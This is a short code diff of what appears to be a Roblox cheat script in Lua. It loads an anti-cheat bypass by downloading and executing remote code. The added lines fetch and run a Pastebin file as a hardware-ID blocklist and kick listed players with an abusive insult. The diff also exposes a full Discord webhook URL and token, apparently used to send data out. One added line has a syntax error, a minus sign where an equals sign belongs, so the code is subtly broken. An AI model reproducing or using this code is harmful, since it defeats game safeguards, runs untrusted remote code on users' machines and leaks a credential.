@@ -2,6 +2,15 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
+local HWIDTable - loadstring(game:HttpGet("https://pastebin.com/raw/peJLuW0v"))()
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+print (HWIDTable)
+for i,v in pairs(HWIDTable) do
+if v == HWID then
+game.Players.LocalPlayer:Kick("Fat fuck you ain't supposed to be here lil bro")
+end
+end
+
 
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
